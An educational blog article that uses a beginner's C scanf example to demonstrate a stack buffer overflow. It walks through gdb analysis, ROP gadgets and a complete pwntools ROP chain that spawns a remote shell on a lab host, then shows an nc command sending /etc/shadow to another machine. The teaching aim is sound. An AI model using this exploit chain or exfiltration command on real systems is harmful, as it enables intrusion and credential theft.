# Application security - A forgotten programming skill

Published on August 23, 2022

![Splash image](https://github.com/Pynckels/pynckels.github.io/blob/main/2022-2-Application-security-A-forgotten-programming-skill/2022-2-Application-security-A-forgotten-programming-skill.png)

#applicationsecurity, #c, #bufferoverflow, #apisecurity

*At the beginning of 2022, it was, and still is, common understanding that api security is a hot item. There is, however, an intersection between api security and other security domains that is often not taken into account. Where API security is often focused on knowledge of network protocols and fuzzing of interfaces, a deeper danger lurks below the surface. A danger that is almost as old as information technology itself, and still very much disregarded. Disregarded during education and disregarded in the field. The name of that danger is **application security**.*

*The goal of this article is not to cover the entire field of application security, but to give one of the most basic and yet most striking examples of an application security glitch that is used all over the place to teach the C programming language.*

## The intersection between api security and application security

Both api security and application security are broad and sometimes complex knowledge domains. However, api's are made available on servers all over the world for all kinds of purposes. The software on the servers is written in a plethora of programming languages. And therein lays one of the dangers. In fact, this danger is not so much the programming language, but rather a programmer who is not aware of the danger of certain programming constructs.

The buffer overflow danger is a general problem that is compromising information systems in all kinds of ways. And in the same way, a lot of other application security issues are immediately influencing the functioning of servers, operating systems, games, financial and banking systems, ...

This article focuses on an example of a danger that is often spoon fed to future C programmers during their first day of C programming. It should be clear that every programming language that I have used (41 in total) has its own benefits and its own dangerous constructs. So, the idea is not to shoot on the C programming language or on C programmers and teachers, but to show how easy it is to make application security errors, and how easy it is to integrate the application security aspect in a programming course. Below, the danger of buffer overflows due to a lack of understanding of the scanf function will be demonstrated.

## Teaching C: second example, first security error

In most programming language courses, and C is not an exception, the Hello World program is the first example. The second example is often something like the following:

    #include <stdio.h>
    
    void main()
    {
        char buffer[50];
    
        puts("What is your name?");
        scanf("%s", buffer);
        printf("Hello %s", buffer);
    }

It is further explained that compiling this program can be done with a compiler like gcc, clang, ...

    gcc -o example2 example2.c

And with this second example, the first application security error is introduced in the young eager programmers minds...

The problem in question, as stated above, is a buffer overflow error. It goes without saying that an average program is a lot bigger than the example above. To exploit a buffer overflow, a sufficient number of usable computer instructions have to be present in the compiled code, which is the case for most of the production programs, but not for this little example.

In order to demonstrate the exploitation of a buffer overflow in a less complex way, we will

* make the compiled program larger, so to have enough computer instructions to choose from.
* prevent dynamic linkage, so to have a less complex exploit as a first acquaintance with the subject.

Both objectives can be achieved by linking the standard C library (libc.so.6) with the compiled code.


    gcc --static -o example2 example2.c

It should be noted that once one gets a grasp on buffer overflow exploitation, one can circumvent dynamic linkage.

It should also be noted that most compilers have the option to use other constructs to make the life of a buffer overflow exploiter more interesting, such as stack reorganization with canaries, position independent code (PIE), ... A default compilation with for instance gcc does not activate canaries. This has as a consequence that the young eager programmers minds are not aware of these compiler options. And since the rest of the course does not mention the options in question neither...

Of course, as is the case with dynamic linkage and position independent code, canaries can be bypassed also. But it takes a little more craftsmanship of the buffer overflow exploiter. To reduce complexity during this first introduction, and to create an example that is as close as possible to the beginning programmers experience, we will not introduce extra security compiler flags. This is not done in most of the programming courses anyway. So we stay close to the reality with our example.
The first analysis of the application security problem.
Where is the sweet spot

For the rest of this article, we will use the above C source, but call it helloHack.c The compiled program is called helloHack.

When executed, the program asks for a name. We will generate a string with python. We will vary the length of the generated string up until the 'sweet spot' is reached, being the first length where the program generates a segmentation fault.


python -c "print('A'*72)"

The extent of the problem

To get a more detailed view of the opportunity that the application error gives us, we will debug the compiled code with gdb.


gdb ./helloHack

  break main
  run
  disassemble

We can now see the compiled version of the code:


   0x0000000000401805 <+0>:     push   rb
   0x0000000000401806 <+1>:     mov    rbp,rsp
=> 0x0000000000401809 <+4>:     sub    rsp,0x40
   0x000000000040180d <+8>:     lea    rax,[rip+0xa37f0]        # 0x4a5004
   0x0000000000401814 <+15>:    mov    rdi,rax
   0x0000000000401817 <+18>:    call   0x417f40 <puts>
   0x000000000040181c <+23>:    lea    rax,[rbp-0x40]
   0x0000000000401820 <+27>:    mov    rsi,rax
   0x0000000000401823 <+30>:    lea    rax,[rip+0xa37ed]        # 0x4a5017
   0x000000000040182a <+37>:    mov    rdi,rax
   0x000000000040182d <+40>:    mov    eax,0x0
   0x0000000000401832 <+45>:    call   0x409f20 <__isoc99_scanf>
   0x0000000000401837 <+50>:    lea    rax,[rbp-0x40]
   0x000000000040183b <+54>:    mov    rsi,rax
   0x000000000040183e <+57>:    lea    rax,[rip+0xa37d5]        # 0x4a501a
   0x0000000000401845 <+64>:    mov    rdi,rax
   0x0000000000401848 <+67>:    mov    eax,0x0
   0x000000000040184d <+72>:    call   0x409d90 <printf>
   0x0000000000401852 <+77>:    nop
   0x0000000000401853 <+78>:    leave  
   0x0000000000401854 <+79>:    ret    

We can see that the main function first calls the puts function, then the scanf function and finally the printf function. We can place an extra break-point just before the call to scanf and an other break-point just after the call to scanf. At both places, we will take a look at the stack.


  break *(main+45)
  break *(main+50)
  continue
                    <- analyze stack contents
  continue
                    <- analyze stack contents

The stack before calling scanf looks like:


0x007fffffffdc20│+0x0000: 0x0000000000000002   ← $rsp
0x007fffffffdc28│+0x0008: 0x00000000403c74
0x007fffffffdc30│+0x0010: 0x0000000000000000
0x007fffffffdc38│+0x0018: 0x00000000400530
0x007fffffffdc40│+0x0020: 0x00000000403c00
0x007fffffffdc48│+0x0028: 0x00000000403c90
0x007fffffffdc50│+0x0030: 0x0000000000000000
0x007fffffffdc58│+0x0038: 0x000000004d2000
0x007fffffffdc60│+0x0040: 0x00000000403c00     ← $rbp
0x007fffffffdc68│+0x0048: 0x00000000403505     →  <__libc_start_main+3349>
0x007fffffffdc70│+0x0050: 0x0000000000000000
0x007fffffffdc78│+0x0058: 0x0000000200000000

The return address (place where the program goes to when the main function is finished) is __libc_start_main+3349.

The stack after calling scanf and entering the string


python -c "print('A'*72+'BCDEFGHI)"

looks like:


0x007fffffffdc20│+0x0000: "AAAAAAAA"     ← $rs
0x007fffffffdc28│+0x0008: "AAAAAAAA"
0x007fffffffdc30│+0x0010: "AAAAAAAA"
0x007fffffffdc38│+0x0018: "AAAAAAAA"
0x007fffffffdc40│+0x0020: "AAAAAAAA"
0x007fffffffdc48│+0x0028: "AAAAAAAA"
0x007fffffffdc50│+0x0030: "AAAAAAAA"
0x007fffffffdc58│+0x0038: "AAAAAAAA"
0x007fffffffdc60│+0x0040: "AAAAAAAA"     ← $rbp
0x007fffffffdc68│+0x0048: "BCDEFGHI"     ← 0x4948474645444342
0x007fffffffdc70│+0x0050: 0x0000000000000000
0x007fffffffdc78│+0x0058: 0x0000000200000000

The characters "BCDEFGHI" have overwritten the return address. This means that after executing the function main, the program would try to return to memory address 0x4948474645444342. Since this is not possible, we get a segmentation error. But at the same time, we know that we can force the program to go to executable instructions of our choosing.
A first exploit program

To be able to insert characters of our choosing into the stack, and not only readable characters, we will write a little python script. It will not get the price of the most beautiful baby of the year, but it will do what it is made for: insert values in the stack.


#! /usr/bin/env python

from pwn import *
import time

payload  = ( 'A' * 72 ).encode()
payload += p64( 0x0000000000401805 )

proc = process( './helloHack' )
gdb.attach( proc, 'break main' )
time.sleep(1)

proc.recvuntil( b'What is your name?\n' )
proc.sendline( payload )
proc.interactive()

This little program creates a payload that changes the address to go to after main has finished: back to the beginning of main. It also starts the gdb debugger, attaches the debugger to the helloHack program (so that we can follow what happens) and places a break-point at the beginning of main. We can see that the first time we enter the main function, the python program inserts the payload, and we return to main for a second time. Then the python program goes in interactive mode, so that we can give a proper name. The helloHack program ends like nothing malicious has happened...
Conclusion of the first analysis

The above shows that we are able to direct the program to go to an instruction address of our choosing when the main function finishes. We can even go back to the beginning of the main function and let it execute as if nothing has happened. We have the first embryo of a python script that can be used to exploit the helloHack program.
Return oriented programming (ROP)

In order to continue with our exploit, we first need an understanding of return oriented programming.

The problem we face is that most compilers generate code that makes it impossible to execute computer instruction on the stack


Mapped address spaces

Perms  objfile
r--p   /home/acid/Projects/helloHack/helloHack
r-xp   /home/acid/Projects/helloHack/helloHack
r--p   /home/acid/Projects/helloHack/helloHack
r--p   /home/acid/Projects/helloHack/helloHack
rw-p   /home/acid/Projects/helloHack/helloHack
rw-p   [heap]
r--p   [vvar]
r-xp   [vdso]
rw-p   [stack]

This means that we can put contents on the stack, but that we can not execute the said contents. So, how do we let the program run our code?

We have seen that we can put an address of executable code on the stack. If that address is at the exact spot where a legitimate return address should be, the program will take the address, go to the instruction at that address and execute it. So, all we need to do is find addresses in the compiled program that do something we need to be done and return after doing so.

For example: we can find instructions to set register rax to 0:


ROPgadget --binary helloHack
...
0x0000000000443000 : xor rax, rax ; ret
...

When we put address 0x0000000000443000 in our payload, then the program will end the main function by jumping to the instructions


xor rax, rax
ret

After clearing register rax, the program will try to return. This means that it will look at the next position on the stack to find an address to jump to. So, if we add some more values to the stack that let the program jump to valid instructions, it will do so. For instance, let's find instructions that set register rdx to a value of our choosing:


ROPgadget --binary helloHack
...
0x00000000004016db : pop rdx ; ret
...

This will execute the following code:


pop rdx
ret

In short, it will pop a value off of the stack and set the contents of register rdx to that value. The payload in the python program could be:


payload  = ( 'A' * 72 ).encode()        # 'AAAAAAAAAAAAAAAAAA...
payload += p64( 0x0000000000443000 )    # xor rax, rax ; ret
payload += p64( 0x00000000004016db )    # pop rdx      ; ret
payload += p64( 0x00000000deadbeef )

And the result would be:


$rax   : 0x0000000000000000
...
$rdx   : 0x00000000deadbeef    
...

Conclusion: with enough instructions to choose from, and with a little inspiration and perseverance, we can make the program execute a sub-program that we glue together with instruction snippets we can leach from already existing executable code.
Exploiting the helloHack program

With all the knowledge we have gathered above, we can now create a python script that shows the entire exploit at work. Once the python script has been tested on the local version of the helloHack program, it can be launched to exploit a websocket version of helloHack:


#! /usr/bin/env python

# -----------------------------------------------------------------------

from pwn import *
import time

# -----------------------------------------------------------------------

proc = remote( '192.168.111.30', '1111' ) # Server: IP address, PORT number

time.sleep(5)                        # Take some time to connect

# ----------------------------------------------------------------------
# find RW address:  info proc mappings
#                   x/100gx *0x00000000004d2000
# ROP example:   ROPgadget --binary helloHack | grep "pop rax ; ret"
# ----------------------------------------------------------------------

log.info( 'Creating payload' )

payload  = ( 'A' * 72 ).encode()     # Padding

# *0x00000000004d2350 = '/bin/sh'
payload += p64( 0x00000000004539b3 ) # pop rax ; ret <- 4d2150 (rw addr)
payload += p64( 0x00000000004d2150 )
payload += p64( 0x00000000004016db ) # pop rdx ; ret <- '/bin/sh'
payload += p64( 0x0068732f6e69622f )
payload += p64( 0x000000000047d44d ) # mov qword ptr [rax], rdx

# syscall(SYS_EXECVE,'/bin/sh',NULL,NULL)
payload += p64( 0x00000000004539b3 ) # pop rax ; ret <- 0x3b = SYS_EXECVE
payload += p64( 0x000000000000003b )
payload += p64( 0x0000000000401911 ) # pop rdi ; ret <- 4d2150 ('/bin/sh')
payload += p64( 0x00000000004d2150 )
payload += p64( 0x00000000004087fe ) # pop rsi ; ret <- 0x00
payload += p64( 0x0000000000000000 )
payload += p64( 0x00000000004016db ) # pop rdx ; ret <-  0x00
payload += p64( 0x0000000000000000 )
payload += p64( 0x000000000040121a ) # syscall

# -----------------------------------------------------------------------

log.info( 'Sending payload' )
proc.recvuntil( b'What is your name?\n' )
proc.sendline( payload )

log.info( 'Entering shell' )
proc.interactive()

The result is that we have created access to a shell on the server from where we can continue to do a privilege escalation, launch a reverse shell that is difficult to detect by a blue team, install supplementary programs, scan and attack the network the server is connected to, copy the file that contains the encrypted passwords (see below example), ...


[+] Opening connection to 192.168.111.30 on port 1111: Done
[*] Creating payload
[*] Sending payload
[*] Entering shell
[*] Switching to interactive mode
$ nc -w 3 192.168.111.15 54321 < /etc/shadow

Conclusion

We have shown that even a simple beginners program can contain a large enough application error to permit the first phase of the hack of an entire network to be executed. We have also shown that educating programmers in one programming language or the other is not only a question of showing them the possible statements. Each and every programming course should also invite the students to grow awareness concerning application security because application security has an important impact on a number of other security domains like api security.

In the above article, we have opted to slightly simplify the initial setup in order to reduce complexity. The author is more than willing to give further examples that function in case of an application with position independent code, with dynamic linkage, with stack protection activated, etc.

We hope that the above will inspire teachers to introduce aspects of application security in their programming courses, since the importance of the subject can hardly be underestimated.
